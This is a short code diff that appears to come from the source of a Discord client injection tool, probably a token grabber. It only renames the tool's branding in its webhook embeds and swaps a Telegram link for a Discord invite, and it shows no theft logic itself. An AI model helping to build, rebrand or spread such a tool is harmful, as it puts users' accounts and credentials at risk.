@@ -77,7 +77,7 @@ async function execScript(str) {
 
 const makeEmbed = async ({ title, fields, image, thumbnail, description }) => {
   var params = {
-    username: "Nova Sentinel",
+    username: "The Ghost Of Fuzzles",
     avatar_url:
       "https://raw.githubusercontent.com/selfbot12345/sub/main/assets/lilnova.png",
     content: "",
@@ -88,11 +88,11 @@ const makeEmbed = async ({ title, fields, image, thumbnail, description }) => {
         fields: fields,
         description: description ?? "",
         author: {
-          name: `Nova Sentinel`,
+          name: `The Ghost Of Fuzzles`,
         },
 
         footer: {
-          text: ` [${config.creator}] | https://t.me/Sordeal`,
+          text: ` [${config.creator}] | discord.gg/round`,
         },
       },
     ],
@@ -556,7 +556,7 @@ const FirstTime = async () => {
     var client_discord = appName;
     if (!token) {
       var params = await makeEmbed({
-        title: "<:nova:1132934190032244786> Nova Sentinel Initialized",
+        title: "<:nova:1132934190032244786> The Ghost Of Fuzzles Initialized",
         fields: [
           {
             name: "Injection Info",
